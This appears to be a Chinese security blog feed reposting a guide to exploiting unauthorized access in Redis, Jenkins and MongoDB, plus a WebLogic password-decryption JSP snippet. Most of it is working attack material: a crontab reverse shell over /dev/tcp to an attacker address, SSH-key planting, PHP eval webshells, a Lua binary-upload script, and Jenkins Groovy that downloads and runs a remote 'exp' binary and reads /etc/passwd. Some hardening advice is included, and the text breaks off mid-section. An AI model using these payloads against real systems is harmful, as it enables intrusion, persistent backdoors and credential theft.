class="string">"weblogic.security.internal.*,weblogic.security.internal.encryption.*"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">   EncryptionService es = <span class="keyword">null</span>;</span><br><span class="line">   ClearOrEncryptedService ces = <span class="keyword">null</span>;</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    s=<span class="string">"&#123;AES&#125;yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k="</span>;</span><br><span class="line">    es = SerializedSystemIni.getEncryptionService();</span><br><span class="line">    <span class="keyword">if</span> (es == <span class="keyword">null</span>) &#123;</span><br><span class="line">       out.println(<span class="string">"Unable to initialize encryption service"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ces = <span class="keyword">new</span> ClearOrEncryptedService(es);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(<span class="string">"\nDecrypted Password is:"</span> + ces.decrypt(s));</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jbossUnauthorizedVulnerability</title>
      <link href="/2020/03/25/jbossUnauthorizedVulnerability/"/>
      <url>/2020/03/25/jbossUnauthorizedVulnerability/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull testjboss/jboss</span><br><span class="line">docker run -d -p 8080:8080 --name jboss testjboss</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非授权访问</title>
      <link href="/2020/03/25/%E9%9D%9E%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
      <url>/2020/03/25/%E9%9D%9E%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<p>未授权访问的tips</p><p><a href="https://xz.aliyun.com/u/3304" target="_blank" rel="noopener"><strong>evi1ox</strong></a> / 2018-05-02 23:00:02 / 浏览数 12546</p><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>知识那么多,大佬们学慢点,我营养跟不上啦! 前人栽树后人乘凉,本文主要是把一些资料依葫芦画瓢学习了下,做了个汇总.</p><h2 id="0x00-小二上酒"><a href="#0x00-小二上酒" class="headerlink" title="0x00 小二上酒"></a>0x00 小二上酒</h2><p><a href="https://github.com/se55i0n/DBScanner" target="_blank" rel="noopener">https://github.com/se55i0n/DBScanner</a></p><blockquote><p>a)Redis未授权访问<br>b)Jenkins未授权访问<br>c)MongoDB未授权访问<br>d)ZooKeeper未授权访问<br>e)Elasticsearch未授权访问<br>f)Memcache未授权访问<br>g)Hadoop未授权访问<br>h)CouchDB未授权访问<br>i)Docker未授权访问</p></blockquote><h2 id="0x01-Redis未授权访问"><a href="#0x01-Redis未授权访问" class="headerlink" title="0x01 Redis未授权访问"></a>0x01 Redis未授权访问</h2><h4 id="1-扫描探测"><a href="#1-扫描探测" class="headerlink" title="1.扫描探测"></a>1.扫描探测</h4><p><strong>(1). 测试时建议 vim /etc/redis.conf</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）cp redis.conf ./src/redis.conf</span><br><span class="line">    （2）bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0</span><br><span class="line">    （3）protected-mode设为no</span><br><span class="line">    （4）启动redis-server  ------&gt;   ./src/redis-server redis.conf</span><br></pre></td></tr></table></figure><p><strong>(2). 攻击者喜欢的命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（1）查看信息：info</span><br><span class="line">    （2）删除所有数据库内容：flushall</span><br><span class="line">    （3）刷新数据库：flushdb</span><br><span class="line">    （4）看所有键：KEYS *，使用select num可以查看键值数据。</span><br><span class="line">    （5）设置变量：set test &quot;who am i&quot;</span><br><span class="line">    （6）config set dir dirpath 设置路径等配置</span><br><span class="line">    （7）config get dir/dbfilename 获取路径及数据配置信息</span><br><span class="line">    （8）save保存</span><br><span class="line">    （9）get 变量，查看变量名称</span><br></pre></td></tr></table></figure><p><strong>(3). msf下利用模块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/redis/file_upload </span><br><span class="line">    auxiliary/scanner/redis/redis_login</span><br><span class="line">    auxiliary/scanner/redis/redis_server</span><br></pre></td></tr></table></figure><p><strong>(4). nmap及获取信息</strong><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092637-afcc4572-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092637-afcc4572-5195-1.png" alt="img"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b02a29da-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b02a29da-5195-1.png" alt="img"></a></p><p>匿名扫描脚本:<a href="https://xz.aliyun.com/t/528" target="_blank" rel="noopener">https://xz.aliyun.com/t/528</a></p><h4 id="2-攻击的几种方法"><a href="#2-攻击的几种方法" class="headerlink" title="2.攻击的几种方法"></a><strong>2.攻击的几种方法</strong></h4><p>参考:<br><a href="http://www.cnblogs.com/xiaozi/p/7568272.html" target="_blank" rel="noopener">http://www.cnblogs.com/xiaozi/p/7568272.html</a><br><a href="https://evi1cg.me/archives/hackredis.html" target="_blank" rel="noopener">https://evi1cg.me/archives/hackredis.html</a></p><p><strong>(1).利用计划任务执行命令反弹shell</strong></p><p>在redis以root权限运行时可以写crontab来执行命令反弹shell<br>先在自己的服务器上监听一个端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 7999</span><br></pre></td></tr></table></figure><p>然后执行命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~## redis-cli -h 192.168.63.130</span><br><span class="line">      192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</span><br><span class="line">      192.168.63.130:6379&gt; config set dir /var/spool/cron/</span><br><span class="line">      192.168.63.130:6379&gt; config set dbfilename root</span><br><span class="line">      192.168.63.130:6379&gt; save</span><br></pre></td></tr></table></figure><p>ps:此处使用bash反弹shell，也可使用其他方法<br><strong>(2).写ssh-keygen公钥然后使用私钥登陆</strong></p><p>在以下条件下，可以利用此方法</p><p>1、Redis服务使用ROOT账号启动</p><p>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。<br>首先在本地生成一对密钥：<br><code>root@kali:~/.ssh## ssh-keygen -t rsa</code></p><p>然后redis执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h x.x.x.x -x set crackit</span><br><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">     &gt; config set dir /root/.ssh/</span><br><span class="line">     &gt; config get dir</span><br><span class="line">     &gt; config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">     &gt; save</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@x.x.x.x</span><br></pre></td></tr></table></figure><p>或者如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir /root/.ssh/</span><br><span class="line">192.168.63.130:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">192.168.63.130:6379&gt; save</span><br></pre></td></tr></table></figure><p><strong>(3).往web物理路径写webshell</strong></p><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir /var/www/html/</span><br><span class="line">      192.168.63.130:6379&gt; config set dbfilename shell.php</span><br><span class="line">      192.168.63.130:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">      192.168.63.130:6379&gt; save</span><br></pre></td></tr></table></figure><p>即可将shell写入web目录(web目录根据实际情况</p><p><strong>(4).写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</strong><br>From:<a href="http://www.00theway.org/2017/03/27/redis_exp/" target="_blank" rel="noopener">http://www.00theway.org/2017/03/27/redis_exp/</a><br>写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">local function hex2bin(hexstr)</span><br><span class="line">    local str = &quot;&quot;</span><br><span class="line">    for i = 1, string.len(hexstr) - 1, 2 do</span><br><span class="line">        local doublebytestr = string.sub(hexstr, i, i+1);</span><br><span class="line">        local n = tonumber(doublebytestr, 16);</span><br><span class="line">        if 0 == n then</span><br><span class="line">            str = str .. &apos;\00&apos;</span><br><span class="line">        else</span><br><span class="line">            str = str .. string.format(&quot;%c&quot;, n)</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    return str</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">local dir = redis.call(&apos;config&apos;,&apos;get&apos;,&apos;dir&apos;)</span><br><span class="line">redis.call(&apos;config&apos;,&apos;set&apos;,&apos;dir&apos;,&apos;/tmp/&apos;)</span><br><span class="line">local dbfilename = redis.call(&apos;config&apos;,&apos;get&apos;,&apos;dbfilename&apos;)</span><br><span class="line">redis.call(&apos;config&apos;,&apos;set&apos;,&apos;dbfilename&apos;,&apos;t&apos;)</span><br><span class="line">local rdbcompress = redis.call(&apos;config&apos;,&apos;get&apos;,&apos;rdbcompression&apos;)</span><br><span class="line">redis.call(&apos;config&apos;,&apos;set&apos;,&apos;rdbcompression&apos;,&apos;no&apos;)</span><br><span class="line">redis.call(&apos;flushall&apos;)</span><br><span class="line"></span><br><span class="line">local data = &apos;1a2b3c4d5e6f1223344556677890aa&apos;</span><br><span class="line">redis.call(&apos;set&apos;,&apos;data&apos;,hex2bin(&apos;0a7c7c7c&apos;..data..&apos;7c7c7c0a&apos;))</span><br><span class="line">local rst = &#123;&#125;</span><br><span class="line">rst[1] = &apos;server default config&apos;</span><br><span class="line">rst[2] = &apos;dir:&apos;..dir[2]</span><br><span class="line">rst[3] = &apos;dbfilename:&apos;..dbfilename[2]</span><br><span class="line">rst[4] = &apos;rdbcompression:&apos;..rdbcompress[2]</span><br><span class="line">return rst</span><br><span class="line">保存以上代码为a.lua，变量data保存的是程序的16进制编码，执行</span><br></pre></td></tr></table></figure><p><code>redis-cli --eval a.lua -h *.*.*.*</code><br>由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli save -h *.*.*.*</span><br><span class="line">redis-cli config set dir *** -h *.*.*.*</span><br><span class="line">redis-cli config set dbfilename *** -h *.*.*.*</span><br><span class="line">redis-cli config set rdbcompression * -h *.*.*.*</span><br></pre></td></tr></table></figure><p>目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了<code>|||</code>作为提取最终文件的标识）。</p><p><code>*/1 * * * * python -c &#39;open(&quot;/tmp/rst&quot;,&quot;a+&quot;).write(open(&quot;/tmp/t&quot;).read().split(&quot;|||&quot;)[1])&#39;</code><br>/tmp/rst为最终上传的文件。</p><p><strong>(5).傻瓜式python脚本</strong><br>From:<a href="https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line">需要root权限，每次添加计划任务前先获取服务器时间，然后根据获取的时间设置执行计划任务的时间，确保命令被执行一次，避免多次执行引发服务器异常。</span><br><span class="line">    python redis_exp.py --host *.*.*.* -c &apos;id&apos;</span><br><span class="line"></span><br><span class="line">上传文件</span><br><span class="line">上传携带脏数据的文件不需要root权限，上传二进制文件需要root权限，先上传带有脏数据的文件，在文件前后插入特征字符串，然后添加计划任务截取数据</span><br><span class="line">    python redis_exp.py --host *.*.*.* -l /data/payload.py -r /tmp/p.py</span><br><span class="line"></span><br><span class="line">暴力猜解目录</span><br><span class="line">不需要root权限，利用 config set dir &apos;xx&apos; 报错进行目录猜解</span><br><span class="line">    python redis_exp.py --host *.*.*.* -f p.txt</span><br><span class="line"></span><br><span class="line">可以通过-p参数更改默认端口，-t参数更改等待时间</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b0460af6-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b0460af6-5195-1.png" alt="img"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b05af56a-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b05af56a-5195-1.png" alt="img"></a></p><p><strong>(6).批量验证</strong><br>From:<a href="https://github.com/Ridter/hackredis" target="_blank" rel="noopener">https://github.com/Ridter/hackredis</a></p><h4 id="3-防护措施"><a href="#3-防护措施" class="headerlink" title="3.防护措施"></a><strong>3.防护措施</strong></h4><p><strong>1.禁止一些高危命令</strong></p><p>修改 redis.conf 文件，添加以下内容，来禁用远程修改 DB 文件地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">      rename-command CONFIG   &quot;&quot;</span><br><span class="line">      rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure><p><strong>2.以低权限运行 Redis 服务</strong></p><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br><code>$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</code><br><strong>3.为 Redis 添加密码验证</strong></p><p>修改 redis.conf 文件，添加<br><code>requirepass mypassword</code><br><strong>4.禁止外网访问 Redis</strong></p><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br><code>bind 127.0.0.1</code><br><strong>5.保证 authorized_keys 文件的安全</strong></p><p>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br><code>## chmod 400 ~/.ssh/authorized_keys</code></p><p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：<br><code>## chattr +i ~/.ssh/authorized_keys</code></p><p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：<br><code>## chattr +i ~/.ssh</code></p><p>注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。<br><strong>6.修改默认端口</strong></p><p>指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字<br><code>## redis-server --port 6380</code></p><p><strong>7.防火墙</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// accept</span><br><span class="line">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><br><span class="line">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><br><span class="line"></span><br><span class="line">// drop</span><br><span class="line">## iptables -I INPUT -p tcp --dport 6379 -j DROP</span><br><span class="line">## iptables -I INPUT -p udp --dport 6379 -j DROP</span><br><span class="line"></span><br><span class="line">// 保存规则并重启 iptables</span><br><span class="line">## service iptables save</span><br><span class="line">## service iptables restart</span><br></pre></td></tr></table></figure><h2 id="0x02-Jenkins未授权访问"><a href="#0x02-Jenkins未授权访问" class="headerlink" title="0x02 Jenkins未授权访问"></a>0x02 Jenkins未授权访问</h2><h4 id="1-扫描探测-1"><a href="#1-扫描探测-1" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p>弱口令扫描:<a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> 或者 <a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a><br>From: <a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2166.html</a><br>CVE-2017-1000353:<a href="https://blogs.securiteam.com/index.php/archives/3171" target="_blank" rel="noopener">https://blogs.securiteam.com/index.php/archives/3171</a><br>提示: script/manage 是管理页面<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092639-b0bfb11c-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092639-b0bfb11c-5195-1.png" alt="img"></a></p><h4 id="2-攻击利用"><a href="#2-攻击利用" class="headerlink" title="2. 攻击利用"></a>2. 攻击利用</h4><p><strong>2.1 反弹shell</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">println &quot;wget http://192.168.3.131:8081/exp -P /tmp/&quot;.execute().text</span><br><span class="line">println &quot;chmod +x /tmp/exp&quot;.execute().text</span><br><span class="line">println &quot;/tmp/exp&quot;.execute().text</span><br></pre></td></tr></table></figure><p>或者直接通过 Terminal+Plugin<br><a href="https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin" target="_blank" rel="noopener">https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin</a></p><p><strong>2.2 写webshell</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1. println &quot;wget http://shell.com/shell.txt -P /var/www/html/&quot;.execute().text</span><br><span class="line"></span><br><span class="line">2. new File(&quot;/var/www/html/shell.php&quot;).write(&apos;&lt;?php @eval($_POST[shell]);?&gt;&apos;);</span><br><span class="line"></span><br><span class="line">3. </span><br><span class="line">def webshell = &apos;&lt;?php @eval($_POST[shell]);?&gt;&apos;</span><br><span class="line">new File(&quot;/var/www/html/shell.php&quot;).write(&quot;$webshell&quot;);</span><br><span class="line"></span><br><span class="line">4. </span><br><span class="line">def execute(cmd) &#123;</span><br><span class="line">def proc = cmd.execute()</span><br><span class="line">proc.waitFor()</span><br><span class="line">&#125;</span><br><span class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo -n &quot;&lt;?php @eval($&quot; &gt; /var/www/html/shell.php&apos; ] )</span><br><span class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo &quot;_POST[shell]);?&gt;&quot; &gt;&gt; /var/www/html/shell.php&apos; ] )</span><br><span class="line">//参数-n 不要在最后自动换行</span><br></pre></td></tr></table></figure><p><strong>2.3 读文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"></span><br><span class="line">text = new File(&quot;/etc/passwd&quot;).getText();</span><br><span class="line"></span><br><span class="line">out.print text</span><br><span class="line"></span><br><span class="line">&#125; catch(Exception e)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.4 执行命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def sout = new StringBuilder(), serr = new StringBuilder()</span><br><span class="line">def proc = &apos;cat /etc/passwd&apos;.execute()</span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line">proc.waitForOrKill(1000)</span><br><span class="line">println &quot;out&gt; $sout err&gt; $serr&quot;</span><br></pre></td></tr></table></figure><p><strong>回显注意点</strong></p><ul><li>Result: 0 表示成功写入</li><li>Result: 1 表示目录不存在或者权限不足 写入失败</li><li>Result: 2 表示构造有异常 写入失败</li></ul><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092640-b1536952-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092640-b1536952-5195-1.png" alt="img"></a></p><p>jenkins可以对每个用户分配不同的权限，如Overall/RunScripts或者Job/Configure权限<br>某些版本匿名用户可以访问asynchPeople 可爆破密码（通常很多密码跟用户名一样或者是其他弱口令(top1000)，尤其是内网）</p><h4 id="3-模拟低权限"><a href="#3-模拟低权限" class="headerlink" title="3. 模拟低权限"></a><strong>3. 模拟低权限</strong></h4><h6 id="省略掉注册并且安装plugin的傻瓜式操作"><a href="#省略掉注册并且安装plugin的傻瓜式操作" class="headerlink" title="省略掉注册并且安装plugin的傻瓜式操作"></a>省略掉注册并且安装plugin的傻瓜式操作</h6><p>默认安装的情况下，匿名用户是没有任何权限的，这里修改配置，让匿名用户只拥有 查看Job、Job Configure 权限</p><p>1.点击 管理(Manage Jenkins) - Configure Global Security</p><p>2.在 添加用户/组(User/group to add): 填入当前登录的用户名，然后点击 Add，移到最右侧，点击 ✔️，让用户拥有所有权限<br>此步非常重要，不然保存后会导致 admin is missing the Overall/Read permission 错误,如下图所示<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092640-b1c4fcca-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092640-b1c4fcca-5195-1.png" alt="img"></a></p><p>3.然后访问 <a href="http://127.0.0.1:8080/newJob" target="_blank" rel="noopener">http://127.0.0.1:8080/newJob</a> ,名称填 Test，类型选择 构建一个自由风格的软件项目(Freestyle project )后点击 Save,如下图所示代表创建成功<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092641-b204befa-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092641-b204befa-5195-1.png" alt="img"></a></p><p>4.新建一个无痕窗口,通过匿名访问看到有配置权限<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092642-b269d5f6-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092642-b269d5f6-5195-1.png" alt="img"></a><br>点击 配置(Configure)，在 Build 部分选择 Execute shell</p><p>在 Command 中填入要执行的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uname -a </span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092642-b2a65ee0-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092642-b2a65ee0-5195-1.png" alt="img"></a></p><p>5.通过查看 Configure 页面的选项，得知在 构建触发器(Build Triggers) 部分可以设置任务 Build 的触发规则，其中有一个 Build periodically，可以通过类似 Crontab 时间规则来触发，这里填入 <code>*/1 * * * *</code> 即每分钟执行一次 Build，点击 Save<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092642-b2e7fcc4-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092642-b2e7fcc4-5195-1.png" alt="img"></a></p><p>6.回到 Job 页面，等待一会，在左侧 Build History 可以看到，每分钟都会执行一次 Build，这里点击查看 Console Output<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092643-b33c391a-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092643-b33c391a-5195-1.png" alt="img"></a><br>命令执行成功<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092644-b3c27354-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092644-b3c27354-5195-1.png" alt="img"></a></p><p>匿名用户是没有 Build 权限，即 Job 的页面中是没有 立即构建(Build Now) 按钮，所以这里无法通过点击 立即构建 来触发命令的执行。</p><h4 id="4-防护措施"><a href="#4-防护措施" class="headerlink" title="4. 防护措施"></a><strong>4. 防护措施</strong></h4><ul><li>在Jenkins管理页面添加访问密码。建议您使用由十位以上数字，字母和特殊符号组成的强密码。</li><li>建议您不要将管理后台开放到互联网上。您可以使用ECS安全组策略设置访问控制，默认策略为拒绝所有通信。您可以根据业务发布情况仅开放* 需要对外用户提供的服务，并控制好访问源IP。</li></ul><h2 id="0x03-MongoDB未授权访问"><a href="#0x03-MongoDB未授权访问" class="headerlink" title="0x03 MongoDB未授权访问"></a>0x03 MongoDB未授权访问</h2><p>MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。</p><ul><li>使用默认 mongod 命令启动 Mongodb</li><li>机器可以被公网访问</li><li>在公网上开放了 Mongodb 